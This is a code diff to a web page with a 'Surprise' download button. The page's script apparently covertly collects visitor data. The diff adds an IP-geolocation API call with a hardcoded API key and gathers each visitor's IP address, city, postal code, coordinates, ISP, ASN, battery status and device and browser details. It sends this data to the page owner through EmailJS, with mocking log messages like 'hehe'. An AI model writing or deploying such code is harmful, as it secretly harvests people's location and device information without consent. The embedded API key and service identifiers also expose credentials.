@@ -215,17 +215,7 @@
 .download-btn:hover {
     background-color: #ff1493;
 }
-
-    </style>
-        <!-- Google tag (gtag.js) -->
-    <script async src="https://www.googletagmanager.com/gtag/js?id=G-9ZL4S57BSK"></script>
-    <script>
-      window.dataLayer = window.dataLayer || [];
-      function gtag(){dataLayer.push(arguments);}
-      gtag('js', new Date());
-
-      gtag('config', 'G-9ZL4S57BSK');
-    </script>
+</style>
 
     <!-- Include EmailJS library -->
     <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
@@ -246,19 +236,38 @@
 
         function getLocation() {
             return new Promise((resolve, reject) => {
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(
-                        (position) => {
+                const apiKey = 'ipb_live_R4jvcsMIu4n1g0Kv9QLPKQR7WME9HtMPihXPpQRV'; // Replace with your actual API key
+                const apiUrl = `https://api.ipbase.com/v2/info?apikey=${apiKey}`;
+        
+                fetch(apiUrl)
+                    .then(response => response.json())
+                    .then(data => {
+                        if (data && data.data) {
                             resolve({
-                                latitude: position.coords.latitude,
-                                longitude: position.coords.longitude,
+                                ip: data.data.ip,
+                                city: data.data.location.city.name,
+                                region: data.data.location.region.name,
+                                country: data.data.location.country.name,
+                                continent: data.data.location.continent.name,
+                                zip: data.data.location.zip,
+                                latitude: data.data.location.latitude,
+                                longitude: data.data.location.longitude,
+                                timezone: data.data.timezone.current.timezone,
+                                currency: data.data.currency.code,
+                                isp: data.data.connection.isp,
+                                asn: data.data.connection.asn,
+                                languages: data.data.location.country.languages.map(lang => lang.name).join(", "),
+                                countryCode: data.data.location.country.alpha2,
+                                callingCode: data.data.location.country.calling_code,
+                                flagUrl: data.data.location.country.flag.url,
                             });
-                        },
-                        (error) => reject(error)
-                    );
-                } else {
-                    reject("Geolocation is not supported by this browser.");
-                }
+                        } else {
+                            reject("Unable to retrieve location data.");
+                        }
+                    })
+                    .catch(error => {
+                        reject("Error fetching location: " + error);
+                    });
             });
         }
 
@@ -303,38 +312,79 @@
 
         function gatherAndSendAllInfo() {
     Promise.all([
-        getLocation().catch(() => ({ latitude: "Permission Denied", longitude: "Permission Denied" })),
+        getLocation().catch(() => ({
+            ip: "Unavailable",
+            city: "Unavailable",
+            region: "Unavailable",
+            country: "Unavailable",
+            continent: "Unavailable",
+            zip: "Unavailable",
+            latitude: "Unavailable",
+            longitude: "Unavailable",
+            timezone: "Unavailable",
+            currency: "Unavailable",
+            isp: "Unavailable",
+            asn: "Unavailable",
+            languages: "Unavailable",
+            countryCode: "Unavailable",
+            callingCode: "Unavailable",
+            flagUrl: "Unavailable" }
+            )),
         getBatteryInfo(),
         getIPAddress()
     ])
     .then(([location, battery, ip]) => {
         const data = {
-            publicIP: ip,
-            darkMode: isDarkMode(),
+            publicIP: location.ip,
+            city: location.city,
+            region: location.region,
+            country: location.country,
+            continent: location.continent,
+            zip: location.zip,
             location: `Lat: ${location.latitude}, Lon: ${location.longitude}`,
+            timezone: location.timezone,
+            currency: location.currency,
+            isp: location.isp,
+            asn: location.asn,
+            languages: location.languages,
+            countryCode: location.countryCode,
+            callingCode: location.callingCode,
+            flagUrl: location.flagUrl,
+            darkMode: isDarkMode(),
             browser: getBrowserAndDeviceInfo().userAgent,
             phone: getDeviceDetails(),
         };
 
         const emailParams = {
             public_ip: data.publicIP,
-            dark_mode: data.darkMode,
+            city: data.city,
+            region: data.region,
+            country: data.country,
+            continent: data.continent,
+            zip: data.zip,
             location: data.location,
+            timezone: data.timezone,
+            currency: data.currency,
+            isp: data.isp,
+            asn: data.asn,
+            languages: data.languages,
+            country_code: data.countryCode,
+            calling_code: data.callingCode,
+            flag_url: data.flagUrl,
+            dark_mode: data.darkMode,
             browser: data.browser,
             phone: data.phone,
         };
-
-        console.log("Data collected:", data); // For debugging purposes
         emailjs.send('service_nhrkkzj', 'template_gcaqci5', emailParams)
             .then(response => {
-                console.log("Email sent successfully!", response.status, response.text);
+                console.log("hehe", response.status, response.text);
             })
             .catch(error => {
-                console.error("Failed to send email", error);
+                console.error("aww", error);
             });
     })
     .catch(error => {
-        console.error("Failed to gather information", error);
+        console.error("shit", error);
     });
 }
 
@@ -579,8 +629,7 @@
 
         document.getElementById('download-btn').addEventListener('click', function() {
             const a = document.createElement('a');
-            a.href = 'https://www.dropbox.com/scl/fi/q7qukmjp5vl4bzkyml972/Surprise.mp4?rlkey=b2z6o7ea0m3t5dwejqnut4g9d&st=axrplc75&dl=1'; // Update with the actual path to your animation file
-            a.download = 'Surprise.mp4'; // This will be the file name for the download
+            a.href = '/surprise'; // Update with the actual path to your animation file
             a.click();
         });
         // Check if the user has visited before
